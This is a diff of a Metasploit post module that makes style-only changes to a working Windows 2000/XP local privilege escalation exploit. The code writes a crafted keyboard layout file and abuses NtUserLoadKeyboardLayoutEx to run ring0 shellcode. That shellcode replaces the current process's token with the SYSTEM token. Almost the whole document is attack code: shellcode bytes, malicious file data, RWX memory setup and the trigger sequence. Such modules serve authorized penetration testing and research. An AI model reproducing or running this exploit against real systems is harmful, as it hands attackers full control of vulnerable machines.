@@ -59,15 +59,15 @@ class MetasploitModule < Msf::Post
     hDll = false
 
     vuln = false
-    winver = session.sys.config.sysinfo["OS"]
+    winver = session.sys.config.sysinfo['OS']
     affected = [ 'Windows 2000', 'Windows XP' ]
-    affected.each { |v|
+    affected.each do |v|
       if winver.include? v
         vuln = true
         break
       end
-    }
-    if not vuln
+    end
+    if !vuln
       print_error("#{winver} is not vulnerable.")
       return
     end
@@ -104,34 +104,34 @@ class MetasploitModule < Msf::Post
       # save registers -- necessary for successful recovery
       "\x60" +
       # get EPROCESS from ETHREAD
-      "\x64\xa1\x24\x01\x00\x00" +
+      "\x64\xa1\x24\x01\x00\x00" \
       "\x8b\x70\x44" +
       # init PID search
-      "\x89\xf0" +
-      "\xbb" + "FFFF" +
-      "\xb9" + "PPPP" +
+      "\x89\xf0" \
+      "\xbb" + 'FFFF' \
+      "\xb9" + 'PPPP' +
       # look for the system pid EPROCESS
-      "\xba" + "SSSS" +
-      "\x8b\x04\x18" +
-      "\x29\xd8" +
-      "\x39\x14\x08" +
+      "\xba" + 'SSSS' \
+      "\x8b\x04\x18" \
+      "\x29\xd8" \
+      "\x39\x14\x08" \
       "\x75\xf6" +
       # save the system token addr in edi
-      "\xbb" + "TTTT" +
-      "\x8b\x3c\x18" +
+      "\xbb" + 'TTTT' \
+      "\x8b\x3c\x18" \
       "\x83\xe7\xf8" +
       # re-init the various offsets
-      "\x89\xf0" +
-      "\xbb" + "FFFF" +
-      "\xb9" + "PPPP" +
+      "\x89\xf0" \
+      "\xbb" + 'FFFF' \
+      "\xb9" + 'PPPP' +
       # find the target pid token
-      "\xba" + "TPTP" +
-      "\x8b\x04\x18" +
-      "\x29\xd8" +
-      "\x39\x14\x08" +
+      "\xba" + 'TPTP' \
+      "\x8b\x04\x18" \
+      "\x29\xd8" \
+      "\x39\x14\x08" \
       "\x75\xf6" +
       # set the target pid's token to the system token
-      "\xbb" + "TTTT" +
+      "\xbb" + 'TTTT' \
       "\x89\x3c\x18" +
       # restore start context
       "\x61" +
@@ -139,46 +139,46 @@ class MetasploitModule < Msf::Post
       "\xc2\x0c\00"
 
     dll_data =
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\xE0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x2E\x64\x61\x74\x61\x00\x00\x00" +
-      "\xE6\x00\x00\x00\x60\x01\x00\x00\xE6\x00\x00\x00\x60\x01\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x94\x01\x00\x00\x9E\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\xA6\x01\x00\x00\xAA\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x9C\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x01\x00\x00\x00\xC2\x01\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
-      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\xE0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x2E\x64\x61\x74\x61\x00\x00\x00" \
+      "\xE6\x00\x00\x00\x60\x01\x00\x00\xE6\x00\x00\x00\x60\x01\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x94\x01\x00\x00\x9E\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\xA6\x01\x00\x00\xAA\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x9C\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x01\x00\x00\x00\xC2\x01\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
+      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
       "\x00\x00\x00\x00\x00\x00"
 
     pid = session.sys.process.getpid
-    print_status("Attempting to elevate PID 0x%x" % pid)
+    print_status('Attempting to elevate PID 0x%x' % pid)
 
     # Prepare the shellcode (replace platform specific stuff, and pid)
     ring0_code.gsub!('FFFF', [flink_off].pack('V'))
@@ -189,7 +189,7 @@ class MetasploitModule < Msf::Post
 
     # Create the malicious Keyboard Layout file...
     tmpdir = session.sys.config.getenv('TEMP')
-    fname = "p0wns.boom"
+    fname = 'p0wns.boom'
     dllpath = "#{tmpdir}\\#{fname}"
     fd = session.fs.file.new(dllpath, 'wb')
     fd.write(dll_data)
@@ -213,34 +213,34 @@ class MetasploitModule < Msf::Post
     mem_size += (0x1000 - (mem_size % 0x1000))
     mem = session.railgun.kernel32.VirtualAlloc(mem_base, mem_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
     if (mem['return'] != mem_base)
-      print_error("Unable to allocate RWX memory @ 0x%x" % mem_base)
+      print_error('Unable to allocate RWX memory @ 0x%x' % mem_base)
       return
     end
-    print_status("Allocated 0x%x bytes of memory @ 0x%x" % [mem_size, mem_base])
+    print_status('Allocated 0x%x bytes of memory @ 0x%x' % [mem_size, mem_base])
 
     # Initialize the buffer to contain NO-OPs
     nops = "\x90" * mem_size
     ret = session.railgun.memwrite(mem_base, nops, nops.length)
-    if not ret
-      print_error("Unable to fill memory with NO-OPs")
+    if !ret
+      print_error('Unable to fill memory with NO-OPs')
       return
     end
 
     # Copy the shellcode to the desired place
     ret = session.railgun.memwrite(addr, ring0_code, ring0_code.length)
-    if not ret
-      print_error("Unable to copy ring0 payload")
+    if !ret
+      print_error('Unable to copy ring0 payload')
       return
     end
 
     # InitializeUnicodeStr(&uStr,L"pwn3d.dll"); -- Is this necessary?
     pKLID = mem_base
     pStr = pKLID + (2 + 2 + 4)
-    kbd_name = "pwn3d.dll"
+    kbd_name = 'pwn3d.dll'
     uni_name = Rex::Text.to_unicode(kbd_name + "\x00")
     ret = session.railgun.memwrite(pStr, uni_name, uni_name.length)
-    if not ret
-      print_error("Unable to copy unicode string data")
+    if !ret
+      print_error('Unable to copy unicode string data')
       return
     end
     unicode_str = [
@@ -249,20 +249,20 @@ class MetasploitModule < Msf::Post
       pStr
     ].pack('vvV')
     ret = session.railgun.memwrite(pKLID, unicode_str, unicode_str.length)
-    if not ret
-      print_error("Unable to copy UNICODE_STRING structure")
+    if !ret
+      print_error('Unable to copy UNICODE_STRING structure')
       return
     end
-    print_status("Initialized RWX buffer ...")
+    print_status('Initialized RWX buffer ...')
 
     # Get the current Keyboard Layout
     ret = session.railgun.user32.GetKeyboardLayout(0)
     if ret['return'] < 1
-      print_error("Unable to GetKeyboardLayout")
+      print_error('Unable to GetKeyboardLayout')
       return
     end
     hKL = ret['return']
-    print_status("Current Keyboard Layout: 0x%x" % hKL)
+    print_status('Current Keyboard Layout: 0x%x' % hKL)
 
 # _declspec(naked) HKL __stdcall NtUserLoadKeyboardLayoutEx(
 #  IN HANDLE Handle,
@@ -298,11 +298,11 @@ class MetasploitModule < Msf::Post
       pop esi
       push 0x101
       push 0x666
-      push #{"0x%x" % pKLID}
-      push #{"0x%x" % hKL}
+      push #{'0x%x' % pKLID}
+      push #{'0x%x' % hKL}
       push 0
       push 0x1ae0160
-      push #{"0x%x" % hDll}
+      push #{'0x%x' % hDll}
       push esi
       #{syscall_stub}
     EOS
@@ -313,16 +313,16 @@ class MetasploitModule < Msf::Post
     # Copy this new system call wrapper function into our RWX memory
     func_ptr = mem_base + 0x1000
     ret = session.railgun.memwrite(func_ptr, bytes, bytes.length)
-    if not ret
+    if !ret
       print_error('Unable to copy system call stub')
       return
     end
-    print_status("Patched in syscall wrapper @ 0x%x" % func_ptr)
+    print_status('Patched in syscall wrapper @ 0x%x' % func_ptr)
 
     # GO GO GO
-    ret = session.railgun.kernel32.CreateThread(nil, 0, func_ptr, nil, "CREATE_SUSPENDED", nil)
+    ret = session.railgun.kernel32.CreateThread(nil, 0, func_ptr, nil, 'CREATE_SUSPENDED', nil)
     if ret['return'] < 1
-      print_error("Unable to CreateThread")
+      print_error('Unable to CreateThread')
       return
     end
     hthread = ret['return']
@@ -330,13 +330,13 @@ class MetasploitModule < Msf::Post
     # Resume the thread to actually have the syscall happen
     ret = client.railgun.kernel32.ResumeThread(hthread)
     if ret['return'] < 1
-      print_error("Unable to ResumeThread")
+      print_error('Unable to ResumeThread')
       return
     end
-    print_good("Successfully executed syscall wrapper!")
+    print_good('Successfully executed syscall wrapper!')
 
     # Now, send some input to cause ring0 payload execution...
-    print_status("Attempting to cause the ring0 payload to execute...");
+    print_status('Attempting to cause the ring0 payload to execute...')
     vInput = [
       1, # INPUT_KEYBOARD - input type
       # KEYBDINPUT struct
@@ -354,16 +354,16 @@ class MetasploitModule < Msf::Post
     # Clean up
     if mem_base
       ret = session.railgun.kernel32.VirtualFree(mem_base, 0, MEM_RELEASE)
-      if not ret['return']
-        print_error("Unable to free memory @ 0x%x" % mem_base)
+      if !(ret['return'])
+        print_error('Unable to free memory @ 0x%x' % mem_base)
       end
     end
 
     # dll_fd.close
     if hDll
       ret = session.railgun.kernel32.CloseHandle(hDll)
-      if not ret['return']
-        print_error("Unable to CloseHandle")
+      if !(ret['return'])
+        print_error('Unable to CloseHandle')
       end
     end
 
